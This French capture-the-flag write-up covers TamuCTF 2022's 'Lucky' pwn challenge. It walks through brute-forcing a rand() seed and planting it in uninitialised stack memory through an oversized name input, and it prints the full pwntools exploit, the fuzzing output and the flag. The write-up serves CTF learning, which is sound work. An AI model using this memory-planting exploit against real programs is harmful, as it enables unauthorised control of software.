---
title: "Lucky | TamuCtf 2022 | Catégorie Pwn | [Vozec/FR] "
date: 2022-04-19T12:00:00Z
description: "Lucky | TamuCtf 2022"
categories: ["writeup"]
tags: ["pwn","tuto","writeup"]
keywords: ["tuto", "reverse","howto","ctf","TamuCtf","ctftime","Lucky","seed","bypass","pwn"]
---


## Fichier(s)
- [Lucky](./files/tweetybirb)
- [Lucky.c](./files/tweetybirb)

## Nécessaires
- Python3 (+ pwntool)

## Flag
```
gigem{un1n1t14l1z3d_m3m0ry_15_r4nd0m_r1ght}
```
## Solution détaillée

Le but du challenge est de sauter dans une fonction *Win* qui fait pop le flag :
```c
void win() {
    char flag[64] = {0};
    FILE* f = fopen("flag.txt", "r");
    fread(flag, 1, sizeof(flag), f);
    printf("Nice work! Here's the flag: %s\n", flag);
}
```

Malheureusement , un ret2win semble difficile à cause de :
- Un fget sécurisé : ``fgets(buf, sizeof(buf), stdin);``
- La randomisation des adresses grâce à l'aslr


###### Regardons le **Main** :

```C
int main() {
    setvbuf(stdout, NULL, _IONBF, 0);
    welcome();
    srand(seed());

    int key0 = rand() == 306291429;
    int key1 = rand() == 442612432;
    int key2 = rand() == 110107425;

    if (key0 && key1 && key2) {
        win();
    } else {
        printf("Looks like you weren't lucky enough. Better luck next time!\n");
    }
}
```

On voit directement qu'il faut 3 conditions pour que le binaire saute dans la fonction *Win*

Ces 3 conditions sont 3 égalités avec un nombre aléatoire.
Cela semble impossible que __3__ nombres aléatoires valent à la suite :  **306291429** , **442612432** puis **110107425**

Pourtant, une fonction intéressante nous intrigue : ``srand()`` .
Ici la seed est définie donc on peut prévoir grâce à celle-ci la suite de nombre qui sera généré pour les 3 futurs conditions.

###### 2 Problèmes s’imposent :
- Quelle **seed** implique la suite **306291429** , **442612432** puis **110107425**
- Comment soumettre cette dite **seed**  à la fonction ``srand()`` .

###### Détermination de la seed.

J'ai écris ce code *C* qui permet de bruteforce toutes les seeds possibles et de s'arreter à la bonne !

```C
int main() {
    int i = 0;
    do
    {
        srand(i);        
        if (rand() == 306291429) {
            if (rand() == 442612432) {
                if (rand() == 110107425) {
                    printf("%d\n", i);
                    return 0;
                }
            }
        }
        ++i;
    } while (1);
}
```

Grâce à ceci, on trouve enfin :

```bash
root@DESKTOP-HNQJECB: /c/lucky_writeup
➜   ./getseed
5649426
```
[getseed](./files/getseed)

Trouvons maintenant un moyen de proposer **5649426** comme seed à notre programme !

###### Soumission de la seed.

Dans le code, on voit que fonction **srand** prend le retour de la fonction **seed** comme paramètre .

```C
int seed() {
    char msg[] = "GLHF :D";
    printf("%s\n", msg);
    int lol;
    return lol;
}
```

Une chose étrange ici est la fin de cette fonction :

```C
int lol;
return lol;
```

On sait que en C , la valeur par défaut d'un int déclaré sans valeur prendra sa dernière valeur dans la mémoire . Soit **0** dans 90% des cas. Pour simplifier, on admettra que  la fonction retourne donc **0**  


Revenons à la fonction **main** , celle-ci appelle **welcome** qui nous demande notre nom:
```C
fgets(buf, sizeof(buf), stdin);
```
Avec **buf** , un buffer de taille **16**.

Que se passe t'il si on remplit cette input avec plus que **16 charactères** ?

J'ai ajouté une ligne dans le programme C avant de le recompiler pour afficher la valeur de retour de **seed** avant de la passer dans **srand**
[luck](./files/luck)

Avec Python et pwntool , voici le code utilisé pour fuzz les entrées :

```python
from pwn import *

context.log_level = 'critical'

def getproc():
	if(args.REMOTE):
		return remote("tamuctf.com", 443, ssl=True, sni="lucky")
	else:
		return process('./luck')


def getseed():
	# p = process('./getseed')
	# seed = p.recv().decode().strip()
	# p.close()
	# return seed
	return '5649426'

def fuzz():
	for k in range(16):
		proc = getproc()
		proc.recvuntil(b'Enter your name:')
		payload = b'B'+(k)*b'A'
		proc.sendline(payload)
		proc.recvuntil(b'GLHF :D')
		rep = proc.recv().decode().split('Looks')[0].strip()
		print('Payload= %s | len= %s | resp= %s'%(payload.decode(),len(payload),hex(int(rep))))
	return None

fuzz()

```

Et voici le résultat :

```bash
root@DESKTOP-HNQJECB: /c/lucky_writeup
➜   python3 lucky_solve.py
Payload= B | len= 1 | resp= 0x0
Payload= BA | len= 2 | resp= 0x0
Payload= BAA | len= 3 | resp= 0x0
Payload= BAAA | len= 4 | resp= 0x0
Payload= BAAAA | len= 5 | resp= 0x0
Payload= BAAAAA | len= 6 | resp= 0x0
Payload= BAAAAAA | len= 7 | resp= 0x0
Payload= BAAAAAAA | len= 8 | resp= 0x0
Payload= BAAAAAAAA | len= 9 | resp= 0x0
Payload= BAAAAAAAAA | len= 10 | resp= 0x0
Payload= BAAAAAAAAAA | len= 11 | resp= 0x0
Payload= BAAAAAAAAAAA | len= 12 | resp= 0xa
Payload= BAAAAAAAAAAAA | len= 13 | resp= 0xa41
Payload= BAAAAAAAAAAAAA | len= 14 | resp= 0xa4141
Payload= BAAAAAAAAAAAAAA | len= 15 | resp= 0x414141
Payload= BAAAAAAAAAAAAAAA | len= 16 | resp= 0x414141
```

On peut donc écrire directement sur la mémoire et celle-ci est récupéré dans **seed** avec
```C
int lol;
return lol;
```


Nous pouvons donc écrire notre exploit final pour inscrire **5649426** en hexadécimal dans la mémoire et obtenir le flag !

```python
from pwn import *

context.log_level = 'critical'

def getproc():
	if(args.REMOTE):
		return remote("tamuctf.com", 443, ssl=True, sni="lucky")
	else:
		return process('./lucky')

def getseed():
	# p = process('./getseed')
	# seed = p.recv().decode().strip()
	# p.close()
	# return seed
	return '5649426'
	# 	valid seed = '5649426'


def fuzz():
	for k in range(16):
		proc = getproc()
		proc.recvuntil(b'Enter your name:')
		payload = b'B'+(k)*b'A'
		proc.sendline(payload)
		proc.recvuntil(b'GLHF :D')
		rep = proc.recv().decode().split('Looks')[0].strip()
		print('Payload= %s | len= %s | resp= %s'%(payload.decode(),len(payload),hex(int(rep))))
	return None

def getpayload(seed_hex):
	payload = b''
	reverse =  [seed_hex[i:i+2] for i in range(0, len(seed_hex), 2)][::-1][:-1]
	for k in reverse:
		payload += bytes(chr(int('0x%s'%k,16)),'utf-8')
	return b'A'*(15-len(payload))+payload

seed = getseed()
seed_hex = hex(int(seed))

proc = getproc()
proc.recvuntil(b'Enter your name:')
proc.sendline(getpayload(seed_hex))
print(proc.recvuntil(b'flag:').decode())
print(proc.recv().decode().strip())
```

Résultat :

```bash
root@DESKTOP-HNQJECB: /c/lucky_writeup
➜   python3 lucky_solve.py REMOTE

Welcome, AAAAAAAAAAAA\x12V
If you're super lucky, you might get a flag! GLHF :D
Nice work! Here's the flag:
gigem{un1n1t14l1z3d_m3m0ry_15_r4nd0m_r1ght}
```
